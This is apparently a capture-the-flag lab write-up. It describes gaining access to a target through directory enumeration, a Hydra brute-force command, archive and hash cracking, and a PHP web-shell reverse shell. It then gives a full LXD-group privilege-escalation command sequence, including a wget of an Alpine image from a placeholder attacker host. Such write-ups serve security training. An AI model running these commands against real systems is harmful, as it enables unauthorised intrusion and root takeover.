# Lab Overview

**Objective:** Gain initial access to the target through web application enumeration, brute-force authentication, and a vulnerable web application, then escalate privileges to **root** by abusing membership in the **LXD** group.

---

# Nmap Scan

We started by performing an Nmap scan against the target.

![](Penetration%20Testing/Images/Pasted%20image%2020260706213325.png)

---

# Service Detection and Nmap Scripts

Next, we performed version detection and executed Nmap scripts to gather additional information about the running services.

![](Penetration%20Testing/Images/Pasted%20image%2020260706213350.png)

---

# Web Directory Enumeration

We used **Gobuster** to discover hidden files and directories on the web server.

Initially, no interesting resources were found.

![](Penetration%20Testing/Images/Pasted%20image%2020260706213558.png)

---

# Enumerating Additional File Extensions

After adding common file extensions to the wordlist, we discovered an interesting text file.

![](Penetration%20Testing/Images/Pasted%20image%2020260426201929.png)

---

# Enumerating Usernames

The text file contained several usernames that could be useful for later attacks.

![](Penetration%20Testing/Images/Pasted%20image%2020260426202027.png)

---

# Full Port Scan

We performed another Nmap scan against **all TCP ports** and discovered an additional service running on:

```text
8080
```

![](Penetration%20Testing/Images/Pasted%20image%2020260706214619.png)

---

# Basic Authentication

Browsing to port **8080** revealed a page protected with **HTTP Basic Authentication**.

![](Penetration%20Testing/Images/Pasted%20image%2020260426211130.png)

---

# Brute Force Attack

Using one of the previously discovered usernames, we performed a brute-force attack with Hydra.

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.130.166.31 -s 8080 http-get /
```

![](Penetration%20Testing/Images/Pasted%20image%2020260426211158.png)

---

# Website Enumeration with Nikto

After authenticating, we used **Nikto** to gather additional information about the web application.

![](Penetration%20Testing/Images/Pasted%20image%2020260426211456.png)

---

# Interesting File

Nikto identified an interesting file.

![](Penetration%20Testing/Images/Pasted%20image%2020260426211828.png)

We examined its contents.

![](Penetration%20Testing/Images/Pasted%20image%2020260706214800.png)

---

# Login Page Discovery

The file revealed the existence of a login page.

![](Penetration%20Testing/Images/Pasted%20image%2020260426211904.png)

---

# Downloadable Archive

Nikto also identified another downloadable file.

![](Penetration%20Testing/Images/Pasted%20image%2020260426211935.png)

We downloaded it for further analysis.

![](Penetration%20Testing/Images/Pasted%20image%2020260706214939.png)

---

# Password-Protected Archive

Attempting to extract the archive showed that it was password protected.

![](Penetration%20Testing/Images/Pasted%20image%2020260426213111.png)

---

# Cracking the Archive Password

We converted the archive into a crackable hash.

![](Penetration%20Testing/Images/Pasted%20image%2020260706215113.png)

Then cracked it using John the Ripper.

![](Penetration%20Testing/Images/Pasted%20image%2020260426213226.png)

---

# Database Credentials

Inside the extracted files, we found a database containing a username and a password hash.

![](Penetration%20Testing/Images/Pasted%20image%2020260426214104.png)

---

# Cracking the User Password

We cracked the hash to recover the plaintext password.

![](Penetration%20Testing/Images/Pasted%20image%2020260707162321.png)

---

# Web Application Login

Using the recovered credentials, we successfully logged into the web application.

![](Penetration%20Testing/Images/Pasted%20image%2020260426214210.png)

---

# Uploading a PHP Web Shell

From the administration panel, we navigated to:

```text
Extensions → Templates → index.php
```

This allowed us to modify the template and upload PHP code.

![](Penetration%20Testing/Images/Pasted%20image%2020260426214604.png)

---

# Remote Code Execution

After uploading the PHP payload, we accessed the modified page to execute the code and obtained a reverse shell.

![](Penetration%20Testing/Images/Pasted%20image%2020260426214847.png)

---

# Privilege Escalation

After gaining shell access, we discovered that the compromised user belonged to the **LXD** group.

![](Penetration%20Testing/Images/Pasted%20image%2020260426215043.png)

Since members of the **LXD** group can create privileged containers, we used the well-known **LXD privilege escalation** technique.

---

# On the Attacker Machine

Clone the Alpine image%20builder:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

sudo ./build-alpine
```

Serve the generated Alpine image:

```bash
python3 -m http.server 8000
```

---

# On the Target Machine

Download the Alpine image:

```bash
wget http://<attacker-ip>:8000/alpine-v3.10-x86_64-<timestamp>.tar.gz -P /tmp
```

Import the image:

```bash
lxc image%20import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
```

Create a privileged container:

```bash
lxc init alpine exploit-container -c security.privileged=true
```

Mount the host filesystem:

```bash
lxc config device add exploit-container host-root disk source=/ path=/mnt/root recursive=true
```

Start the container:

```bash
lxc start exploit-container
```

Obtain a shell inside the container:

```bash
lxc exec exploit-container /bin/sh
```

---

# Access the Host Filesystem

Inside the container:

```bash
cd /mnt/root

cat /root/flag.txt
```

Since the host filesystem is mounted inside the privileged container, we were able to access files as **root**, successfully completing the privilege escalation.